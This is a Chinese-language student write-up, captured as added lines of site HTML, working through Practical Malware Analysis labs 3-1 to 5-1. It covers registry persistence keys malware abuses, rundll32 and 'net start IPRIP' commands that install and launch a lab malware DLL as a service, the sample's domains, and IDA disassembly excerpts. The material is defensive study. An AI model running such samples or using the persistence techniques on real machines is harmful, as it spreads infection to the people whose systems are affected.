+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p><strong>SOFTWARE\Classes\http\shell\open\command</strong></p>
+<p><strong>用途</strong>：</p>
+<ul>
+<li>这个注册表路径定义了系统如何处理 <code>http</code> 协议的链接。</li>
+<li><code>command</code> 子键包含一个字符串值，指定了当用户点击一个 HTTP 链接时要执行的命令。</li>
+</ul>
+<p><strong>分析</strong>：</p>
+<ul>
+<li>浏览器默认应用程序设置：通常，这里会设置为某个浏览器的可执行文件路径，比如 <code>C:\Program Files (x86)\Google\Chrome\Application\chrome.exe</code>。</li>
+<li>恶意软件可能会修改这个键，以便劫持 HTTP 链接，重定向到恶意网站或执行恶意程序。</li>
+</ul>
+<p>*<em>Software\Microsoft\Active Setup\Installed Components*</em></p>
+<p><strong>用途</strong>：</p>
+<ul>
+<li><code>Active Setup</code> 用于在用户登录时执行配置任务和更新。</li>
+<li><code>Installed Components</code> 下的每个子键对应一个已安装的组件，这些组件可以在用户首次登录时执行特定的配置操作。</li>
+</ul>
+<p><strong>分析</strong>：</p>
+<ul>
+<li>系统组件和应用程序可能会在此注册表路径下创建子键，以便在用户登录时执行特定任务。</li>
+<li>恶意软件也可能利用这个路径，在用户登录时执行恶意代码。</li>
+</ul>
+<p><strong>SOFTWARE\Microsoft\Windows\CurrentVersion\Run</strong></p>
+<p><strong>用途</strong>：</p>
+<ul>
+<li>这个注册表路径包含的子键定义了在用户登录时自动启动的程序。</li>
+<li>每个子键的名称是启动项的名称，值是要执行的程序的路径。</li>
+</ul>
+<p><strong>分析</strong>：</p>
+<ul>
+<li>合法的启动项：例如，防病毒软件、驱动程序相关程序、即时通讯软件等。</li>
+<li>恶意软件常常在这里添加启动项，以便在用户每次登录时自动运行其恶意代码。</li>
+</ul>
+<p><strong>SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</strong></p>
+<p><strong>用途</strong>：</p>
+<ul>
+<li>这个注册表路径定义了用户外壳文件夹的位置，如桌面、我的文档、收藏夹等。</li>
+<li>子键和值对应了系统和用户特定的文件夹路径。</li>
+</ul>
+</li>
+<li>
+<p>所使用的句柄表：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-1</a> 2.png)</p>
+<p>听说它创建了一个互斥体，但是我运行起来进程就退出了，没有看到有互斥体。（可能是什么反调试？）</p>
+<p>不明白</p>
+</li>
+<li>
+<p>恶意软件解析了域名<code>www.practicalmalwareanalysis.com</code></p>
+</li>
+</ol>
+<h3>Lab 3-2<span class="hx-absolute -hx-mt-20" id="lab-3-2"></span>
+    <a href="#lab-3-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>----------------
+Lab03-02.dll
+----------------
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+实验内容：
+1、你怎么样让这个恶意代码自行安装？
+2、在安装之后，你如何让这个恶意代码运行起来？
+3、你怎么能找到这个恶意代码是在哪个进程下运行的？
+4、你可以在Process Monitor工具中设置什么样的过滤器，才能收集这个恶意代码的信息？
+5、这个恶意代码在主机上的感染迹象特征是什么？
+6、这个恶意代码是否存在一些有用的网络特征码
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ol>
+<li>
+<p>使用die看一下导出表：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-2" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-2</a> 1.png)</p>
+<p>这个dll可能是使用install函数进行安装的，再看一下导入表：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-2" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-2</a> 2.png)</p>
+<p>可以看到一些对注册表操作的api和一些关于服务的相关操作，还有关于http的相关操作：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-2" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-2</a> 3.png)</p>
+<p>搜索字符串可以看到，有一个叫svchost的exe文件，有可能是shellcode加载器</p>
+</li>
+<li>
+<p>安装dll指令：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rundll32.exe Lab03-02.dll,installA</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>使用如下命令启动：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>net start IPRIP</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+</li>
+<li>
+<p>多次运行安装指令，可以发现有多个名为<code>svchost.exe</code>的进程：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-2" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-2</a> 5.png)</p>
+<p>而且这些进程的ID号最小的只有一个680的，其他ID的进程则是软件创建的。</p>
+</li>
+<li>
+<p>因为dll是需要exe加载运行，所以我们设置Process Name为dll名字是无效的,而我们这里的Process Name是<code>svchost.exe</code>，但是系统中有很多的svchost.exe导致我们不好定位，这里解决的办法是得到进程的pid</p>
+</li>
+<li>
+<p>查看软件的字符串：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-2" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-2</a> 4.png)</p>
+<p>可以看到对应的解析域名，访问的http</p>
+</li>
+</ol>
+<h3>Lab 3-3<span class="hx-absolute -hx-mt-20" id="lab-3-3"></span>
+    <a href="#lab-3-3" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>主要的文件操作：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-3" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-3</a> 1.png)</p>
+<p>不理解为什么有一堆A，用die查看导入表，可以发现有写进程内存的函数，推测有对应的操作：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-3" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-3</a> 2.png)</p>
+<h3>Lab 3-4<span class="hx-absolute -hx-mt-20" id="lab-3-4"></span>
+    <a href="#lab-3-4" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>运行后有自删除操作。</p>
+<p>导入表中导入了WS2_32.dll，可能有与网络交互操作。</p>
+<p>分析软件行为时发现调用了cmd.exe，这个指令应该是自我删除吧：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-3" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-3</a> 3.png)</p>
+<p>其余的基本操作：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-3" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-3</a> 4.png)</p>
+<p><strong>下面的操作都需要使用ida了</strong></p>
+<h3>Lab 5-1<span class="hx-absolute -hx-mt-20" id="lab-5-1"></span>
+    <a href="#lab-5-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>----------------
+Lab05-01.dll
+----------------
+
+使用工具：
+1. IDA Pro
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+1、DllMain的地址是什么？
+2、使用Imports窗口并浏览到的gethostbyname，导入函数定位到什么地址？
+3、有多少函数调用了gethostbyname？
+4、将精力集中在位于0x10001757处的对gethostbyname的调用，你能找出哪个DNS请求将被触发吗？
+5、IDA Pro识别了在0x10001656处的子过程中的多少个局部变量？
+6、IDA Pro识别了在0x10001656处的子过程中的多少个参数？
+7、使用Strings窗口，来在反汇编中定位字符串\cmd.exe /c 。它位于哪？
+8、在引用\cmd.exe /c的代码所在的区域发生了什么？
+9、在同一的区域，在0x100101C8处，看起来好像是dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？(提示：使用dword_1008E5C4的交叉引用。)
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ol>
+<li>
+<p>DllMain的地址：0x1000D02E</p>
+</li>
+<li>
+<p>.idata:100163CC</p>
+</li>
+<li>
+<p><code>ctrl+x</code>找交叉引用：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/5-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/5-1</a> 1.png)</p>
+</li>
+<li>
+<p>这个名为<code>[This is RDO]pics.praticalmalwareanalysis.com</code>将会被调用：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/5-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/5-1</a> 2.png)</p>
+</li>
+<li>
+<p>如下：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#75715e">; =============== S U B R O U T I N E =======================================
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#75715e">; DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">sub_10001656</span>    <span style="color:#66d9ef">proc</span> <span style="color:#66d9ef">near</span>               <span style="color:#75715e">; DATA XREF: DllMain(x,x,x)+C8↓o
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_675</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">675</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_674</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">674</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">hModule</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">670</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">timeout</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">timeval</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">66</span><span style="color:#66d9ef">Ch</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">name</span>            <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">sockaddr</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">664</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_654</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">word</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">654</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">in</span>              <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">in_addr</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">650</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">Str1</span>            <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">644</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_640</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">640</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">CommandLine</span>     <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">63</span><span style="color:#66d9ef">Fh</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">Str</span>             <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">63</span><span style="color:#66d9ef">Dh</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_638</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">638</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_637</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">637</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_544</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">544</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_50C</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">50</span><span style="color:#66d9ef">Ch</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_500</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">500</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">Buf2</span>            <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">4</span><span style="color:#66d9ef">FCh</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">readfds</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">fd_set</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">4</span><span style="color:#66d9ef">BCh</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">buf</span>             <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">3</span><span style="color:#66d9ef">B8h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_3B0</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">3</span><span style="color:#66d9ef">B0h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_1A4</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">1</span><span style="color:#66d9ef">A4h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">var_194</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">194</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">WSAData</span>         <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">WSAData</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">190</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10001656</span> <span style="color:#a6e22e">lpThreadParameter</span><span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">ptr</span>  <span style="color:#ae81ff">4</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+</li>
+<li>
+<p><code>DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)</code>一个参数</p>
+</li>
+<li>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>xdoors_d:<span style="color:#960050;background-color:#1e0010">10095</span><span style="color:#a6e22e">B34</span> <span style="color:#66d9ef">aCmdExeC</span>        <span style="color:#66d9ef">db</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span><span style="color:#66d9ef">cmd.exe</span> <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">c</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#ae81ff">0</span>     <span style="color:#960050;background-color:#1e0010">;</span> <span style="color:#66d9ef">DATA</span> <span style="color:#66d9ef">XREF</span>: <span style="color:#66d9ef">sub_1000FF58</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">278</span><span style="color:#960050;background-color:#1e0010">↑</span><span style="color:#66d9ef">o</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+</li>
+<li>
+<p>可以看到一系列的linux指令，可能就是模拟Linux shell：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/5-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/5-1</a> 3.png)</p>
+</li>
+<li>
+<p>获取版本消息：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span> <span style="color:#75715e">; =============== S U B R O U T I N E =======================================
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span> <span style="color:#75715e">; Attributes: bp-based frame
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span> <span style="color:#75715e">; BOOL sub_10003695()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span> <span style="color:#a6e22e">sub_10003695</span>    <span style="color:#66d9ef">proc</span> <span style="color:#66d9ef">near</span>               <span style="color:#75715e">; CODE XREF: sub_10001656+1D↑p
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span>                                         <span style="color:#75715e">; sub_10003B75+7↓p ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span> <span style="color:#a6e22e">VersionInformation</span><span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">_OSVERSIONINFOA</span> <span style="color:#66d9ef">ptr</span> -<span style="color:#ae81ff">94</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10003695</span>                 <span style="color:#a6e22e">push</span>    <span style="color:#66d9ef">ebp</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10003696</span>                 <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">10003698</span>                 <span style="color:#a6e22e">sub</span>     <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">94</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">1000369</span><span style="color:#a6e22e">E</span>                 <span style="color:#66d9ef">lea</span>     <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">ebp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">VersionInformation</span>]
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">100036</span><span style="color:#a6e22e">A4</span>                 <span style="color:#66d9ef">mov</span>     [<span style="color:#66d9ef">ebp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">VersionInformation.dwOSVersionInfoSize</span>], <span style="color:#ae81ff">94</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">100036</span><span style="color:#a6e22e">AE</span>                 <span style="color:#66d9ef">push</span>    <span style="color:#66d9ef">eax</span>             <span style="color:#75715e">; lpVersionInformation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#960050;background-color:#1e0010">100036</span><span style="color:#a6e22e">AF</span>                 <span style="color:#66d9ef">call</span>    <span style="color:#66d9ef">ds</span>:<span style="color:#66d9ef">GetVersionExA</span>
+</span></span><span style="display:flex;"><span>.text:<span style="color:#960050;background-color:#1e0010">100036</span><span style="color:#a6e22e">B5</span>                 <span style="color:#66d9ef">xor</span>     <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
